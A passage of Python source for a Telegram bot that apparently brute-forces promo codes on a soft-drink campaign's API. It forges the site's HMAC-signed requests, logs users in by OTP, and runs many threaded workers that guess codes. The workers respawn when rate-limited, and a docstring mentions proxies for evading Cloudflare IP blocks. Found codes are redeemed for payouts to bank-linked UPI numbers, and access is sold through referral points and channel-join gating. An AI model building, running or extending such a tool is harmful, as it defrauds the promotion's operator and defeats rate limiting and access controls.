        }
    return all_joined, unjoined, status_map


def invalidate_membership_cache(chat_id=None):
    with _membership_cache_lock:
        if chat_id is None:
            _membership_cache.clear()
        else:
            try:
                _membership_cache.pop(str(int(chat_id)), None)
            except Exception:
                _membership_cache.pop(str(chat_id), None)


def stop_user_session_if_active(chat_id, reason=None):
    with sessions_lock:
        keys = []
        try:
            keys.append(int(chat_id))
        except Exception:
            pass
        keys.append(chat_id)
        s = None
        for k in keys:
            s = user_sessions.get(k)
            if s is not None:
                break
        if s and s.session_active:
            s.request_stop()
            if reason:
                try:
                    send_telegram(chat_id, reason)
                except Exception:
                    pass
            return True
    return False


def enforce_channel_membership(chat_id, force=False, intro=None):
    if is_admin(chat_id):
        return True, {}
    all_joined, unjoined, status_map = check_channel_membership_cached(chat_id, force=force)
    if all_joined:
        return True, status_map
    stop_user_session_if_active(
        chat_id,
        reason=(
            "⛔ *Session stopped*\n"
            "────────────────\n"
            "You left a required channel.\n"
            "Rejoin both channels to continue."
        ),
    )
    send_join_gate(chat_id, status_map=status_map, intro=intro)
    return False, status_map


def build_join_message(status_map=None, intro=None):
    status_map = status_map or {}
    lines = []
    if intro:
        lines.append(intro)
        lines.append("")
    lines.append("🔐 *Unlock access*")
    lines.append("────────────────")
    lines.append("Join *both* channels, then tap verify.\n")
    for ch in REQUIRED_CHANNELS:
        uname = channel_username(ch)
        st = status_map.get(uname, "?")
        ok = st in JOINED_STATUSES
        mark = "✅" if ok else "⬜"
        lines.append(f"{mark}  [{get_channel_display_name(ch)}]({get_channel_link(ch)})")
    lines.append("")
    lines.append("👉 Tap *✅ I've Joined* when done")
    lines.append("⚠️ Stay joined — leave = bot stops")
    return "\n".join(lines)


def join_channels_keyboard(status_map=None):
    status_map = status_map or {}
    # URL buttons must stay inline (keyword buttons can't open URLs)
    inline_rows = []
    for ch in REQUIRED_CHANNELS:
        uname = channel_username(ch)
        joined = status_map.get(uname) in JOINED_STATUSES
        inline_rows.append([{
            "text": get_channel_button_text(ch, joined=joined),
            "url": get_channel_link(ch),
        }])
    # Action buttons at the bottom — mix of inline (for URL channels + keyword)
    inline_rows.append([{"text": "✅ I've Joined", "callback_data": "check_joined"}])
    inline_rows.append([{"text": "🔄 Refresh", "callback_data": "refresh_join"}])
    return {"inline_keyboard": inline_rows}


def unauthorized_keyboard(status_map=None):
    return join_channels_keyboard(status_map=status_map)


def send_join_gate(chat_id, status_map=None, intro=None):
    send_telegram(
        chat_id,
        build_join_message(status_map=status_map, intro=intro),
        join_channels_keyboard(status_map=status_map),
        disable_web_page_preview=True,
    )


# ---------- Usage tracking ----------
_usage_cache = {}
_usage_lock = threading.Lock()
_usage_dirty = False


def load_usage_log():
    global _usage_cache
    if _usage_cache:
        return _usage_cache
    if os.path.exists(USAGE_LOG_FILE):
        try:
            with open(USAGE_LOG_FILE, "r", encoding="utf-8") as f:
                _usage_cache = json.load(f)
        except Exception:
            _usage_cache = {}
    return _usage_cache


def _flush_usage():
    global _usage_dirty
    if _usage_dirty:
        _atomic_json_write(USAGE_LOG_FILE, _usage_cache)
        _usage_dirty = False


def get_today_str():
    return datetime.now().astimezone().strftime("%Y-%m-%d")


def log_phone_usage(chat_id, phone_number):
    global _usage_dirty
    with _usage_lock:
        load_usage_log()
        today = get_today_str()
        uk = str(chat_id)
        if uk not in _usage_cache:
            _usage_cache[uk] = {}
        if today not in _usage_cache[uk]:
            _usage_cache[uk][today] = {"phones": [], "sessions": 0}
        if phone_number not in _usage_cache[uk][today]["phones"]:
            _usage_cache[uk][today]["phones"].append(phone_number)
        _usage_dirty = True
        _flush_usage()


def log_session_start(chat_id):
    global _usage_dirty
    with _usage_lock:
        load_usage_log()
        today = get_today_str()
        uk = str(chat_id)
        if uk not in _usage_cache:
            _usage_cache[uk] = {}
        if today not in _usage_cache[uk]:
            _usage_cache[uk][today] = {"phones": [], "sessions": 0}
        _usage_cache[uk][today]["sessions"] += 1
        _usage_dirty = True
        _flush_usage()


def get_usage_report():
    with _usage_lock:
        load_usage_log()
        _flush_usage()
        usage = dict(_usage_cache)
    today = get_today_str()
    lines = [
        f"📊 *Usage — {today}*",
        "────────────────",
    ]
    total_phones = 0
    total_sessions = 0
    active = 0
    for uid, days in sorted(usage.items()):
        if today not in days:
            continue
        d = days[today]
        pc = len(d.get("phones", []))
        sc = d.get("sessions", 0)
        if pc == 0 and sc == 0:
            continue
        active += 1
        total_phones += pc
        total_sessions += sc
        tag = " · admin" if str(uid).isdigit() and int(uid) in ADMIN_IDS else ""
        lines.append(f"• `{uid}`{tag}")
        lines.append(f"  📱 {pc} numbers · 🔁 {sc} sessions")
    if active == 0:
        lines.append("_No activity today yet._")
    lines.append("────────────────")
    lines.append(f"👥 *{active}* active · 📱 *{total_phones}* · 🔁 *{total_sessions}*")
    return "\n".join(lines)


def home_message(chat_id):
    """Clean home / welcome card for authorized users."""
    if is_admin(chat_id):
        return (
            "👑 *Admin Dashboard*\n"
            "────────────────\n"
            "✨ Choose an action below\n\n"
            f"💎 Points: *{access_info(chat_id)}*\n"
            "⚡ High-speed search enabled"
        )
    return (
        "✨ *Welcome back!*\n"
        "────────────────\n"
        "🚀 Ready when you are\n\n"
        f"💎 Points: *{access_info(chat_id)}*\n"
        f"👥 Refers: *{get_successful_refers(chat_id)}*\n"
        f"🎁 Reward: *{_fmt_reward()}* per invite\n"
        "────────────────\n"
        "⚠️ 1 scan = 1 point spent"
    )


def no_time_message(chat_id):
    link = bot_refer_link(chat_id)
    return (
        "⏳ *No points left*\n"
        "────────────────\n"
        "✅ You're approved\n"
        "⌛ Balance is zero — earn points below\n\n"
        f"🎁 Invite 1 friend → *{_fmt_reward()}*\n\n"
        f"🔗 *Your invite link*\n`{link}`\n\n"
        f"💎 Status: Approved · 0 points · refer 1 friend for *{_fmt_reward()}*\n"
        "────────────────\n"
        "📌 Friend joins both channels → points added"
    )


def refer_card(chat_id):
    link = bot_refer_link(chat_id)
    return (
        "🎁 *Invite & Earn*\n"
        "────────────────\n"
        f"🔗 `{link}`\n\n"
        f"📣 Share this link\n"
        f"🎉 Friend joins both channels → you get *{_fmt_reward()}*\n\n"
        f"👥 Successful refers: *{get_successful_refers(chat_id)}*\n"
        f"💎 Your points: *{access_info(chat_id)}*\n"
        "────────────────\n"
        "⚠️ 1 scan = 1 point spent"
    )


def access_card(chat_id):
    return (
        "💎 *My Points*\n"
        "────────────────\n"
        f"📌 Status: *{access_info(chat_id)}*\n"
        f"👥 Successful refers: *{get_successful_refers(chat_id)}*\n\n"
        f"🎁 Rule: *1 invite = {_fmt_reward()}*\n"
        "────────────────\n"
        "⚠️ 1 scan = 1 point spent"
    )


# ---------- Keyword (Reply) keyboards ----------
def main_menu_keyboard():
    return {"keyboard": [
        ["🚀 Start Session", "🔑 Login Only"],
        ["📊 Live Stats", "🛑 Stop"],
        ["🎁 Invite & Earn", "💎 My Points"],
        ["🏠 Home"],
    ], "resize_keyboard": True, "one_time_keyboard": True}


def admin_keyboard():
    return {"keyboard": [
        ["🚀 Start Session", "🔑 Login Only"],
        ["📊 Live Stats", "🛑 Stop"],
        ["📥 Members", "👥 Users"],
        ["🎁 Grant Points", "📈 Usage"],
        ["📢 Broadcast", "🔗 Invite"],
        ["🎯 Grant All Members"],
        ["💎 My Points", "🏠 Home"],
    ], "resize_keyboard": True, "one_time_keyboard": True}


def session_active_keyboard():
    return {"keyboard": [
        ["📊 Live Stats", "🛑 Stop Search"],
    ], "resize_keyboard": True, "one_time_keyboard": True}


# ---------- Per-user session class ----------
class UserSession:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.is_admin = is_admin(chat_id)
        self.session_active = False
        self.new_session_event = threading.Event()
        self.next_session_mode = "full"
        self.input_queue = queue.Queue()
        self.current_input_state = None
        self.stop_event = threading.Event()
        self.current_stats = {"checked": 0, "invalid": 0, "valid": 0}
        self.current_found_code = None
        self.stats_lock = threading.Lock()
        self.tested_codes = set()
        self.tested_lock = threading.Lock()
        self.invalid_codes_file = f"{INVALID_CODES_PREFIX}{chat_id}.txt"
        self._load_tested_codes()
        self.http_session = None
        self.session_thread = None

    def _load_tested_codes(self):
        if os.path.exists(self.invalid_codes_file):
            try:
                with open(self.invalid_codes_file, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            self.tested_codes.add(line)
            except Exception:
                pass
        # also load legacy path next to script
        legacy = os.path.join(_SCRIPT_DIR, f"invalid_codes_{self.chat_id}.txt")
        if os.path.exists(legacy):
            try:
                with open(legacy, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            self.tested_codes.add(line)
            except Exception:
                pass

    def send(self, message, reply_markup=None):
        send_telegram(self.chat_id, message, reply_markup)

    def send_menu(self, message):
        kb = admin_keyboard() if self.is_admin else main_menu_keyboard()
        self.send(message, kb)

    def send_session_buttons(self, message):
        self.send(message, session_active_keyboard())

    def wait_for_input(self, prompt, state, validator=None, error_msg=None):
        self.current_input_state = state
        self.send(prompt)
        while True:
            if self.stop_event.is_set():
                self.current_input_state = None
                return None
            try:
                text = self.input_queue.get(timeout=0.5)
            except queue.Empty:
                continue
            if text is None:
                self.current_input_state = None
                return None
            text = (text or "").strip()
            if not text:
                self.send(error_msg or "❌ Empty input. Try again 👇")
                continue
            if validator:
                if validator(text):
                    self.current_input_state = None
                    return text
                self.send(error_msg or "❌ Invalid input. Try again 👇")
                continue
            self.current_input_state = None
            return text

    def handle_input(self, text):
        self.input_queue.put(text)
        return True

    def get_stats_reply(self):
        with self.stats_lock:
            c = self.current_stats["checked"]
            i = self.current_stats["invalid"]
            v = self.current_stats["valid"]
            code = self.current_found_code
        r = (
            "📊 *Live Stats*\n"
            "────────────────\n"
            f"🔎 Checked: *{c}*\n"
            f"❌ Invalid: *{i}*\n"
            f"✅ Valid: *{v}*"
        )
        if code:
            r += f"\n🎉 Found: `{code}`"
        if self.session_active:
            r += "\n\n🟢 *Search running…*"
        else:
            r += "\n\n⚪ Idle"
        return r

    def reset_stats(self):
        with self.stats_lock:
            self.current_stats = {"checked": 0, "invalid": 0, "valid": 0}
            self.current_found_code = None

    def request_stop(self):
        if self.session_active:
            self.stop_event.set()
            self.input_queue.put(None)
            return True
        return False

    def _clear_queue(self):
        while not self.input_queue.empty():
            try:
                self.input_queue.get_nowait()
            except queue.Empty:
                break

    def _make_http_session(self):
        """Each worker gets its own Session — requests.Session is not thread-safe.
        Search workers go direct (no proxy) for maximum speed.
        """
        sess = requests.Session()
        sess.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"})
        sess.cookies.set("thumsup_and_sprite-id", MASTER_KEY)
        return sess

    def _make_otp_session(self):
        """Fresh session for every OTP attempt."""
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"})
        s.cookies.set("thumsup_and_sprite-id", MASTER_KEY)
        if _OTP_PROXY_URL:
            s.proxies = {"http": _OTP_PROXY_URL, "https": _OTP_PROXY_URL}
        return s

    def run_session_loop(self):
        self.send_menu(home_message(self.chat_id))

        while True:
            self.new_session_event.wait()
            self.new_session_event.clear()
            self.session_active = True
            self.stop_event.clear()
            mode = self.next_session_mode

            ok, _ = enforce_channel_membership(
                self.chat_id,
                force=True,
                intro="⛔ *Access locked*\nRejoin both channels to start a session.",
            )
            if not ok:
                self.session_active = False
                continue

            if not is_admin(self.chat_id):
                with users_lock:
                    u = authorized_users.get(str(int(self.chat_id)))
                    pts = int(u.get("points_balance", 0) or 0)
                    if pts < 1:
                        self.session_active = False
                        self.send_menu("❌ *Insufficient points*\n1 scan needs 1 point.\n👉 Refer friends to earn more!")
                        continue

            log_session_start(self.chat_id)
            self.reset_stats()
            self.send_session_buttons(
                "🚀 *Session starting…*\n"
                "────────────────\n"
                "💬 Keep this chat open\n"
                "🛑 Tap *Stop Search* anytime\n"
                f"💎 Cost: 1 point (Balance: {access_info(self.chat_id)})\n"
                "⚠️ 1 scan = 1 point spent"
            )

            sess = self._make_http_session()
            self.http_session = sess

            try:
                try:
                    res = sess.post(BASE_URL, json={"masterKey": MASTER_KEY}, timeout=15)
                    body = res.json() if res.content else {}
                except Exception:
                    body = {}
                if not isinstance(body, dict):
                    body = {}
                init = decrypt_response(body.get("resp", ""))
                if not init:
                    self.session_active = False
                    self.send_menu("❌ Setup failed.\n👉 Tap *🚀 Start Session* to retry.")
                    continue
                user_key = str(init.get("userKey") or "").strip()
                data_key = init.get("dataKey") or ""
                if not user_key or not data_key:
                    self.session_active = False
                    self.send_menu("❌ Setup incomplete.\n👉 Tap *🚀 Start Session* to retry.")
                    continue
                hit_api_with_session(sess, "clickTrack", {}, user_key, data_key)

                self._clear_queue()
                phone = self.wait_for_input(
                    "📱 *Step 1/3 — Mobile*\n"
                    "────────────────\n"
                    "Send your *10-digit* number 👇",
                    "phone",
                    validator=lambda t: t.strip().isdigit() and len(t.strip()) == 10,
                    error_msg="❌ Need exactly *10 digits*. Try again 👇",
                )
                if phone is None:
                    self.session_active = False
                    self.send_menu("🛑 Session cancelled.")
                    continue
                log_phone_usage(self.chat_id, phone)

                # --- Step 2a: send OTP (site needs up to 3 tries) ---
                _reg_status, _reg_resp = 0, {}
                for _reg_attempt in range(1, 4):
                    self.send(f"⏳ Sending OTP… attempt {_reg_attempt}/3")
                    _reg_status, _reg_resp = hit_api_with_session(
                        self._make_otp_session(), "register", {"mobile": phone}, user_key, data_key
                    )
                    if not isinstance(_reg_resp, dict):
                        _reg_resp = {}
                    if _reg_status == 200:
                        break
                    if _reg_attempt < 3:
                        _reg_wait = _reg_attempt * 2  # 2s, 4s
                        self.send(f"⚠️ Attempt {_reg_attempt} failed — retrying in {_reg_wait}s…")
                        time.sleep(_reg_wait)

                if _reg_status != 200:
                    _reg_err = (_reg_resp.get("error") or f"status {_reg_status}") if _reg_resp else f"status {_reg_status}"
                    self.session_active = False
                    self.send_menu(
                        f"❌ Could not send OTP after 3 attempts ({_reg_err}).\n"
                        "📶 Check your number is correct and try again.\n"
                        "👉 Tap *🚀 Start Session* to retry."
                    )
                    continue
                self.send("✅ OTP sent! Check your SMS inbox 📩\n_(May take up to 60 seconds)_")

                self._clear_queue()
                otp = self.wait_for_input(
                    "🔐 *Step 2/3 — OTP*\n"
                    "────────────────\n"
                    "Enter the code sent to your phone 👇",
                    "otp",
                    validator=lambda t: t.strip().isdigit() and 4 <= len(t.strip()) <= 6,
                    error_msg="❌ OTP must be *4–6 digits*. Try again 👇",
                )
                if otp is None:
                    self.session_active = False
                    self.send_menu("🛑 Session cancelled.")
                    continue

                # --- Step 2b: verify OTP (site needs up to 6 tries) ---
                access_token = None
                v = {}
                _MAX_OTP_TRIES = 6
                for _otp_attempt in range(1, _MAX_OTP_TRIES + 1):
                    # Honour a stop request before firing the next attempt.
                    if self.stop_event.is_set():
                        break
                    self.send(f"⏳ Verifying OTP… attempt {_otp_attempt}/{_MAX_OTP_TRIES}")
                    _otp_status, v = hit_api_with_session(
                        self._make_otp_session(), "verifyOTP", {"otp": otp}, user_key, data_key
                    )
                    if not isinstance(v, dict):
                        v = {}
                    if v.get("userKey"):
                        user_key = str(v["userKey"])
                    access_token = v.get("accessToken")
                    if access_token:
                        break
                    if _otp_attempt < _MAX_OTP_TRIES:
                        _otp_wait = min(_otp_attempt * 2, 8)  # 2s, 4s, 6s, 8s, 8s
                        _otp_err = v.get("error") or "no token"
                        self.send(f"⚠️ Attempt {_otp_attempt} failed ({_otp_err}) — retrying in {_otp_wait}s…")
                        # Interruptible sleep — wake immediately if Stop is tapped.
                        if self.stop_event.wait(timeout=_otp_wait):
                            break  # stop_event fired during the wait

                if self.stop_event.is_set():
                    self.session_active = False
                    self.send_menu("🛑 Stopped.")
                    continue

                if not access_token:
                    self.session_active = False
                    err_detail = v.get("error") or "wrong / expired OTP"
                    self.send_menu(
                        f"❌ OTP failed after {_MAX_OTP_TRIES} attempts ({err_detail}).\n"
                        "👉 Tap *🚀 Start Session* to retry with a fresh OTP."
                    )
                    continue

                # selectPack — up to 6 attempts.
                # 429 rate-limits get a medium backoff (10 s, 15 s, 20 s, 25 s, 30 s) → ~100 s worst case.
                # Other transient errors keep the original short backoff (3 s, 5 s, …).
                _PACK_MAX = 6
                s1, r1 = 0, {}
                for _pack_attempt in range(_PACK_MAX):
                    try:
                        fresh_sess = self._make_http_session()
                        fresh_sess.cookies.update(sess.cookies)
                        s1, r1 = hit_api_with_session(
                            fresh_sess, "selectPack", {"pack": "full"}, user_key, data_key, access_token
                        )
                        if s1 == 200:
                            sess = fresh_sess
                            break
                    except Exception:
                        pass
                    if _pack_attempt < _PACK_MAX - 1:
                        if s1 == 429:
                            # Rate-limited — 10s, 15s, 20s, 25s, 30s → ~100s worst case
                            _pack_wait = 10 + (_pack_attempt * 5)
                        else:
                            _pack_wait = 3 + (_pack_attempt * 2)    # 3s, 5s, 7s, 9s, 11s
                        self.send(
                            f"⏳ Setting up… retry {_pack_attempt + 1}/{_PACK_MAX - 1} in {_pack_wait}s"
                        )
                        time.sleep(_pack_wait)
                if s1 != 200:
                    self.session_active = False
                    self.send_menu(f"❌ Pack select failed ({s1}).\n👉 Tap *🚀 Start Session* to retry.")
                    continue

                # selectVibe — same strategy as selectPack.
                _VIBE_MAX = 6
                s2, r2 = 0, {}
                for _vibe_attempt in range(_VIBE_MAX):
                    try:
                        fresh_sess = self._make_http_session()
                        fresh_sess.cookies.update(sess.cookies)
                        s2, r2 = hit_api_with_session(
                            fresh_sess, "selectVibe", {"vibe": "soft savage"}, user_key, data_key, access_token
                        )
                        if s2 == 200:
                            sess = fresh_sess
                            break
                    except Exception:
                        pass
                    if _vibe_attempt < _VIBE_MAX - 1:
                        if s2 == 429:
                            # Rate-limited — 10s, 15s, 20s, 25s, 30s → ~100s worst case
                            _vibe_wait = 10 + (_vibe_attempt * 5)
                        else:
                            _vibe_wait = 3 + (_vibe_attempt * 2)    # 3s, 5s, 7s, 9s, 11s
                        self.send(
                            f"⏳ Warming up… retry {_vibe_attempt + 1}/{_VIBE_MAX - 1} in {_vibe_wait}s"
                        )
                        time.sleep(_vibe_wait)

                if s2 != 200:
                    self.session_active = False
                    self.send_menu(f"❌ Vibe select failed ({s2}).\n👉 Tap *🚀 Start Session* to retry.")
                    continue

                self.send_session_buttons(
                    "🔎 *Step 3/3 — Searching*\n"
                    "────────────────\n"
                    "🛑 Tap *Stop Search* anytime\n"
                    "📡 Progress every ~20s"
                )

                search_stop = threading.Event()
                search_stop.found_code = None
                search_stop.found_response = None
                code_queue = queue.Queue(maxsize=CODE_QUEUE_SIZE)
                workers_started = {"n": 0}
                workers_started_lock = threading.Lock()

                gen = threading.Thread(
                    target=code_generator,
                    args=(code_queue, search_stop, self.tested_codes, self.tested_lock),
                    daemon=True,
                )
                gen.start()

                # Submit workers to global pool (shared hard cap across members).
                worker_futures = []
                for _ in range(THREADS):
                    try:
                        fut = _search_pool.submit(
                            worker,
                            code_queue,
                            search_stop,
                            user_key,
                            data_key,
                            access_token,
                            self,
                            workers_started,
                            workers_started_lock,
                        )
                        worker_futures.append(fut)
                    except Exception:
                        pass  # pool at OS thread limit; fewer workers is acceptable

                last_member_check = 0.0
                last_progress = time.time()
                last_worker_respawn = time.time()
                left_channel = False
                no_workers = False
                max_search_seconds = int(os.environ.get("SLAYPROMO_SEARCH_TIMEOUT", "0"))
                search_started = time.time()
                # Throughput watchdog — if checked count doesn't move for
                # STALL_THRESHOLD seconds, workers are 429-looping; cancel and respawn.
                STALL_THRESHOLD = 15
                last_checked_snap = 0
                last_checked_time = time.time()

                def _spawn_workers(n=None):
                    n = THREADS if n is None else int(n)
                    # Reset counter so "started==0" detection stays meaningful after respawn
                    with workers_started_lock:
                        workers_started["n"] = 0
                    spawned = []
                    for _ in range(max(1, n)):
                        try:
                            fut = _search_pool.submit(
                                worker,
                                code_queue,
                                search_stop,
                                user_key,
                                data_key,
                                access_token,
                                self,
                                workers_started,
                                workers_started_lock,
                            )
                            spawned.append(fut)
                        except Exception:
                            pass  # pool at OS thread limit; skip this worker slot
                    return spawned

                while not search_stop.is_set():
                    if self.stop_event.is_set():
                        search_stop.set()
                        break
                    now = time.time()
                    if max_search_seconds > 0 and (now - search_started) >= max_search_seconds:
                        search_stop.set()
                        break

                    found_now = getattr(search_stop, "found_code", None)

                    # --- throughput watchdog ---
                    # Checked count frozen for STALL_THRESHOLD s → workers 429-looping.
                    # Cancel stale futures and spawn a fresh batch.
                    with self.stats_lock:
                        _cur_checked = self.current_stats["checked"]
                    if _cur_checked != last_checked_snap:
                        last_checked_snap = _cur_checked
                        last_checked_time = now
                    elif not found_now and (now - last_checked_time) >= STALL_THRESHOLD:
                        for fut in worker_futures:
                            fut.cancel()
                        worker_futures = _spawn_workers(THREADS)
                        last_checked_time = now
                        last_worker_respawn = now

                    # --- all-done respawn ---
                    all_done = worker_futures and all(f.done() for f in worker_futures)
                    if all_done and not found_now and not self.stop_event.is_set():
                        with workers_started_lock:
                            started = workers_started["n"]
                        if started == 0 and (now - search_started) > 8:
                            # pool never accepted workers
                            no_workers = True
                            search_stop.set()
                            break
                        # Respawn full worker set and keep searching
                        if now - last_worker_respawn >= 2:
                            last_worker_respawn = now
                            worker_futures = _spawn_workers(THREADS)
                            # soft progress note so user knows it's still alive
                            with self.stats_lock:
                                c = self.current_stats["checked"]
                                inv = self.current_stats["invalid"]
                            self.send_session_buttons(
                                "🔎 *Still searching…*\n"
                                "────────────────\n"
                                f"✅ Checked: *{c}*\n"
                                f"❌ Invalid: *{inv}*\n"
                                "♻️ Workers refreshed — keep waiting"
                            )
                    if now - last_member_check >= 15:
                        last_member_check = now
                        still_joined, _, _ = check_channel_membership_cached(self.chat_id, force=True)
                        if not still_joined:
                            left_channel = True
                            self.stop_event.set()
                            search_stop.set()
                            self.send(
                                "⛔ *Search stopped*\n"
                                "────────────────\n"
                                "You left a required channel."
                            )
                            enforce_channel_membership(
                                self.chat_id,
                                force=True,
                                intro="⛔ *Access locked*\nRejoin both channels to continue.",
                            )
                            break
                    if now - last_progress >= 20:
                        last_progress = now
                        with self.stats_lock:
                            c = self.current_stats["checked"]
                            inv = self.current_stats["invalid"]
                        self.send_session_buttons(
                            "🔎 *Still searching…*\n"
                            "────────────────\n"
                            f"✅ Checked: *{c}*\n"
                            f"❌ Invalid: *{inv}*\n"
                            "🟢 Running until code is found"
                        )
                    time.sleep(0.3)

                # drain generator queue so put() unblocks
                while not code_queue.empty():
                    try:
                        code_queue.get_nowait()
                    except queue.Empty:
                        break

                # wait briefly for workers (pool-managed)
                for fut in worker_futures:
                    try:
                        fut.result(timeout=5)
                    except Exception:
                        pass

                if self.stop_event.is_set():
                    self.session_active = False
                    if not left_channel:
                        self.send_menu("🛑 Search stopped.\n👉 Ready when you are.")
                    continue

                if not getattr(search_stop, "found_code", None):
                    self.session_active = False
                    if no_workers:
                        self.send_menu(
                            "❌ *Search couldn't start*\n"
                            "────────────────\n"
                            "⏳ Server is busy right now\n"
                            "👉 Wait ~30s and try again"
                        )
                    else:
                        # Should be rare now (no hard timeout). Soft message, no "timed out".
                        with self.stats_lock:
                            c = self.current_stats["checked"]
                        self.send_menu(
                            "🛑 *Search ended*\n"
                            "────────────────\n"
                            f"🔎 Checked: *{c}*\n"
                            "👉 Tap *🚀 Start Session* to continue"
                        )
                    continue

                code = search_stop.found_code
                resp_json = search_stop.found_response or {}
                # Send code first, JSON second — avoids Telegram 4096 hard-fail
                self.send(
                    "🎉 *Code found!*\n"
                    "────────────────\n"
                    f"🏷️ `{code}`"
                )
                try:
                    blob = json.dumps(resp_json, indent=2, ensure_ascii=False)
                    if len(blob) > 3500:
                        blob = blob[:3500] + "\n…(truncated)"
                    self.send(f"```json\n{blob}\n```")
                except Exception:
                    pass

                # Deduct 1 point only after code is successfully found
                if not self.is_admin:
                    with users_lock:
                        u = authorized_users.get(str(int(self.chat_id)))
                        if u:
                            pts = int(u.get("points_balance", 0) or 0)
                            u["points_balance"] = pts - 1
                            authorized_users[str(int(self.chat_id))] = u
                            save_authorized_users(authorized_users)

                if mode == "full":
                    # How many times to silently retry a transient server error
                    # (429 / 5xx) before asking the user for a different number.
                    _UPI_MAX_RETRIES = 3
                    _UPI_BACKOFF = [3, 6, 10]   # seconds between retries

                    while True:
                        self._clear_queue()
                        upi = self.wait_for_input(
                            "📱 *Final step — Bank Mobile Number*\n"
                            "────────────────\n"
                            "Enter the mobile number linked to your bank account 👇",
                            "upi",
                            validator=lambda t: t.strip().isdigit() and len(t.strip()) == 10,
                            error_msg="❌ Must be a 10-digit mobile number. Try again 👇",
                        )
                        if upi is None:
                            self.send("🛑 Stopped.")
                            break

                        fs, fr = 0, {}
                        for _upi_attempt in range(_UPI_MAX_RETRIES):
                            fs, fr = hit_api_with_session(
                                sess, FINAL_API_ENDPOINT, {"upiNo": upi}, user_key, data_key, access_token
                            )
                            if fs == 200:
                                break
                            # Retry only on rate-limit (429) or server errors (5xx);
                            # any other failure (4xx, network 0) is not retryable.
                            if fs == 429 or (500 <= fs < 600):
                                if _upi_attempt < _UPI_MAX_RETRIES - 1:
                                    wait = _UPI_BACKOFF[_upi_attempt]
                                    self.send(
                                        f"⏳ Server busy — retrying in {wait}s "
                                        f"({_upi_attempt + 1}/{_UPI_MAX_RETRIES - 1})…"
                                    )
                                    time.sleep(wait)
                                    continue
                            # Non-retryable status or retries exhausted — stop now.
                            break

                        if fs == 200:
                            self.send(
                                "✅ *Success!*\n"
                                "────────────────\n"
                                f"```json\n{json.dumps(fr, indent=2, ensure_ascii=False)}\n```"
                            )
                            break
                        self.send("❌ Failed. Send a different bank-linked mobile number 👇")
                else:
                    self.send("🔑 *Login-only complete*\n✅ No UPI needed.")

                self.session_active = False
                if self.stop_event.is_set():
                    self.send_menu("🛑 Stopped.\n👉 Ready when you are.")
                else:
                    self.send_menu("🏁 *All done!*\n👉 Tap *🚀 Start Session* anytime.")

            except Exception as e:
                self.send(f"❌ Error: `{str(e)}`")
                self.session_active = False
                self.send_menu("❌ Something broke.\n👉 Tap *🚀 Start Session* to retry.")


            finally:
                # Always reset session_active even if error reporting itself raises
                self.session_active = False


# ---------- API helpers ----------
def decrypt_response(resp):
    """Decode base64 JSON API payload. Returns dict or None."""
    if not resp:
        return None
    try:
        if isinstance(resp, (bytes, bytearray)):
            raw = base64.b64decode(resp)
        else:
            raw = base64.b64decode(str(resp))
        data = json.loads(raw.decode("utf-8", errors="replace"))
        return data if isinstance(data, dict) else None
    except Exception:
        return None


def hit_api_with_session(sess, endpoint, payload, user_key, data_key, access_token=None, max_retries=3):
    if not user_key or not data_key:
        return 0, {"error": "missing_keys"}
    data_key = str(data_key)
    # HMAC slice needs enough chars; pad safely if API ever returns a short key
    key_material = (data_key + ("0" * 18))[4:18]
    # Keep the original caller payload; timestamp+signature are recomputed each attempt
    # so the server never sees a stale t= value or a replayed HMAC on retries.
    base_payload = dict(payload or {})
    headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
    if access_token:
        headers["authorization"] = f"Bearer {access_token}"
    for attempt in range(max_retries):
        # Recompute timestamp and full HMAC signature on every attempt so that
        # retries after a timeout (up to 6 s) never carry a stale t= value.
        t = int(time.time() * 1000)
        attempt_payload = dict(base_payload)
        attempt_payload["t"] = t
        attempt_payload["userKey"] = user_key
        p = json.dumps(attempt_payload, separators=(",", ":"))
        a = base64.b64encode(p.encode()).decode()
        u = base64.b64encode(str(t).encode()).decode()
        h = hmac.new(key_material.encode(), f"{u}.{a}".encode(), hashlib.sha256).hexdigest()
        f = base64.b64encode(h.encode()).decode()
        g = f"43{f[:3]}{''.join(random.choices('ABCDEF0123456789', k=4))}{f[3:]}"
        data = (
            f"userKey={user_key}&data="
            f"{urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
        )
        try:
            r = sess.post(
                f"{BASE_URL}/{endpoint}/{user_key}?t={t}",
                data=data,
                headers=headers,
                timeout=6,
            )
            try:
                body = r.json() if r.content else {}
            except Exception:
                body = {}
            if not isinstance(body, dict):
                body = {}
            return r.status_code, decrypt_response(body.get("resp", "")) or {}
        except requests.exceptions.ConnectionError:
            if attempt < max_retries - 1:
                time.sleep(0.4 * (attempt + 1))
                continue
            return 0, {"error": "connection_failed"}
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                time.sleep(0.4 * (attempt + 1))
                continue
            return 0, {"error": "timeout"}
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(0.4 * (attempt + 1))
                continue
            return 0, {"error": "exception"}


def worker(
    code_queue,
    stop_event,
    user_key,
    data_key,
    access_token,
    user_session,
    workers_started=None,
    workers_started_lock=None,
):
    """Search worker. Does NOT exit when queue is briefly empty — that was killing
    searches under multi-user load. Uses its own HTTP session routed through
    the assigned residential SOCKS5 proxy to bypass Cloudflare IP blocks.
    Search workers go direct — no proxy — for free-flow throughput.
    Global concurrency is capped by ThreadPoolExecutor(GLOBAL_SEARCH_WORKERS).
    """
    local_sess = None
    try:
        if workers_started is not None and workers_started_lock is not None:
            with workers_started_lock:
                workers_started["n"] = int(workers_started.get("n", 0)) + 1
        local_sess = user_session._make_http_session()
        idle_rounds = 0
        while not stop_event.is_set():
            try:
                code = code_queue.get(timeout=1)
                idle_rounds = 0
            except queue.Empty:
                idle_rounds += 1
                # Stay alive for the whole search. Generator / pool lag is normal.
                # Only exit if search was stopped (or extremely long idle as last resort).
                if stop_event.is_set():
                    break
                if idle_rounds >= 600:  # ~10 min empty queue — safety only
                    break
                continue
            if stop_event.is_set():
                break
            with user_session.tested_lock:
                if code in user_session.tested_codes:
                    continue
                user_session.tested_codes.add(code)
            try:
                status, resp = hit_api_with_session(
